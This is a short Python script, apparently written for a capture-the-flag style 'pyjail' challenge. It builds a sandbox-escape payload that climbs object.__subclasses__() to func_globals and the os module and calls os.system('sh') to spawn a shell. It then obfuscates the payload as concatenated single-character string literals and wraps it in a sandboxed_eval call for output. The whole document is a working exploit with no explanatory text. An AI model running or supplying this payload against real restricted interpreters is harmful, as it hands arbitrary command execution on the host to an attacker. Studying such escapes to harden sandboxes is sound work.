s = '().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals["sys"].modules["os.path"].os.system("sh")'

s2 = '+'.join(['\'{}\''.format(x) for x in s])

print('(lambda:sandboxed_eval({}))()'.format(s2))

